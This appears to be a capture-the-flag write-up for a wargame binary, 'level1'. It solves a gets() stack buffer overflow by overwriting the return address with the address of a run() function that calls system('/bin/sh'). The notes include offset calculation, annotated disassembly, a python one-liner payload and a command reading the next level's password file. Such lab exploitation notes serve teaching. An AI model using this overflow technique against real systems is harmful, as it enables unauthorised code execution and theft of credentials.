- attack: buffer overflow with direct shell call
- binary behavior: get argument and do nothing
- targeted functions: run and main
- vulnerability in main: gets() function (receives user input) has no buffer limit
- vulnerability in run: system() runs /bin/sh

Method:
- find return function address
- find the offset padding size
- overflow the binary
- overwrite eip with the return function address
- cat passwd when you will access console with root privedges

Info:
- 0x08048444 - address of run function
- 0x44484080 - same in little-endian
- same in hex - \x44\x84\x04\x08

- eip register address after segfault - 0x63413563
- its offset - 76 (from wiremask.eu)
72 - SIGSEGV, Segmentation fault.
76 - SIGILL, Illegal instruction.

- offset code structure: 76 = 4 (return address) + 72 (padding)


QA
- how do we know the padding size? 
- by interative search

- how do we find the return function address?
- find it in assembler code before finction name: 08048444 <run>

- why we need random pattern generation and simple multiplication of same symbol doesn't work for overflowing in gdb?

- why we use cat here?
- /bin/sh is called through the pipe and became non-interactive (it read stdin with EOF and closes). cat enables interactive listening here

Code:
objdump -d ./level1
gdb level1
    r A # run with argument
(gdb)  r  <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
(python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
cat /home/user/level2/.pass

Functions
main
08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp     # put buffer in esp
 8048486:       83 ec 50                sub    $0x50,%esp           # of size 80
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax      # - 16 = 64 and put it in eax 
 804848d:       89 04 24                mov    %eax,(%esp)          # and put in in buffer  
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>   # exploit - buffer in gets
 8048495:       c9                      leave
 8048496:       c3                      ret # put here the adress of run function


run
08048444 <run>: # run function address
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt> #exploit
 804847e:       c9                      leave
 804847f:       c3


